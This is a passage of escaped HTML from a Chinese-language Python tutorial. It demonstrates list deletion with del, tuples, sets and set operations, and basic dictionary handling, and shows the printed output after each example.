&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; var

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 23, 3, 6, &#39;test&#39;]
[1, 23, 6, &#39;test&#39;]
[23, &#39;test&#39;]
[]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;元组和序列&#34;&gt;&lt;a href=&#34;#元组和序列&#34; class=&#34;headerlink&#34; title=&#34;元组和序列&#34;&gt;&lt;/a&gt;元组和序列&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
tuple2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;hhhh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;aaaa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;tuple2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
(1, 2, 3, 4, 5)
((1, 2, 3, 4, 5), (&#39;test&#39;, &#39;hhhh&#39;, &#39;aaaa&#39;))
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;集合-1&#34;&gt;&lt;a href=&#34;#集合-1&#34; class=&#34;headerlink&#34; title=&#34;集合&#34;&gt;&lt;/a&gt;集合&lt;/h3&gt;&lt;p&gt;功能包括关系测试和消除重复元素&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;basket &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;orange&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;apple&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;pear&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;orange&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;banana&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;basket&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                      &lt;span class=&#34;token comment&#34;&gt;# 删除重复的&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;banana&#39;, &#39;orange&#39;, &#39;apple&#39;, &#39;pear&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;orange&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; basket&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                 &lt;span class=&#34;token comment&#34;&gt;# 检测成员&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# True&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;crabgrass&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; basket&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# False&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 以下演示了两个集合的操作&lt;/span&gt;
a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abracadabra&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;alacazam&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                      &lt;span class=&#34;token comment&#34;&gt;# a 中唯一的字母&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;c&#39;, &#39;r&#39;, &#39;b&#39;, &#39;a&#39;, &#39;d&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                  &lt;span class=&#34;token comment&#34;&gt;# 在 a 中的字母，但不在 b 中&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;r&#39;, &#39;b&#39;, &#39;d&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;|&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                  &lt;span class=&#34;token comment&#34;&gt;# 在 a 或 b 中的字母&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;c&#39;, &#39;r&#39;, &#39;l&#39;, &#39;m&#39;, &#39;z&#39;, &#39;b&#39;, &#39;a&#39;, &#39;d&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                  &lt;span class=&#34;token comment&#34;&gt;# 在 a 和 b 中都有的字母&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;c&#39;, &#39;a&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;                  &lt;span class=&#34;token comment&#34;&gt;# 在 a 或 b 中的字母，但不同时在 a 和 b 中&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;m&#39;, &#39;z&#39;, &#39;r&#39;, &#39;b&#39;, &#39;l&#39;, &#39;d&#39;}&lt;/span&gt;

a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;x &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;abracadabra&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; x &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;abc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;d&#39;, &#39;r&#39;}&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;banana&#39;, &#39;orange&#39;, &#39;apple&#39;, &#39;pear&#39;}
True
False
{&#39;c&#39;, &#39;r&#39;, &#39;b&#39;, &#39;a&#39;, &#39;d&#39;}
{&#39;r&#39;, &#39;b&#39;, &#39;d&#39;}
{&#39;c&#39;, &#39;r&#39;, &#39;l&#39;, &#39;m&#39;, &#39;z&#39;, &#39;b&#39;, &#39;a&#39;, &#39;d&#39;}
{&#39;c&#39;, &#39;a&#39;}
{&#39;m&#39;, &#39;z&#39;, &#39;r&#39;, &#39;b&#39;, &#39;l&#39;, &#39;d&#39;}
{&#39;d&#39;, &#39;r&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;字典-1&#34;&gt;&lt;a href=&#34;#字典-1&#34; class=&#34;headerlink&#34; title=&#34;字典&#34;&gt;&lt;/a&gt;字典&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;sape&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4139&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;guido&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4127&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;jack&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4098&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;sape&#39;: 4139, &#39;guido&#39;: 4127, &#39;jack&#39;: 4098}&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 空字典&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {}&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {2: &#39;test&#39;, &#39;test&#39;: 1}&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dddd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;test&#39;: 1, 1: &#39;dddd&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出2,test的值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;keys&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有键名&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# dict_keys([&#39;test&#39;, 1])&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有键值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# dict_values([1, &#39;dddd&#39;])&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;txt&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 修改键值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {2: &#39;test&#39;, &#39;test&#39;: &#39;txt&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; dict2&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 删除一个键&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;test&#39;: 1}&lt;/span&gt;
dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 清空字典&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; dict2  &lt;span class=&#34;token comment&#34;&gt;# 删除字典&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;str&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;var&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 重复时后者覆盖前者&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;1&#39;: 2, &#39;var&#39;: &#39;var&#39;, &#39;test&#39;: &#39;test&#39;}&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{&#39;sape&#39;: 4139, &#39;guido&#39;: 4127, &#39;jack&#39;: 4098}
{}
{2: &#39;test&#39;, &#39;test&#39;: 1}
{&#39;test&#39;: 1, 1: &#39;dddd&#39;}
test 1
dict_keys([&#39;test&#39;, 1])
dict_values([1, &#39;dddd&#39;])
{2: &#39;test&#39;, &#39;test&#39;: &#39;txt&#39;}
{&#39;test&#39;: 1}
{}
{&#39;1&#39;: 2, &#39;var&#39;: &#39;var&#39;, &#39;test&#39;: &#39;test&#39;}
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果关键字只是简单的字符串，使用关键字参数指定键值&lt;/p&gt;
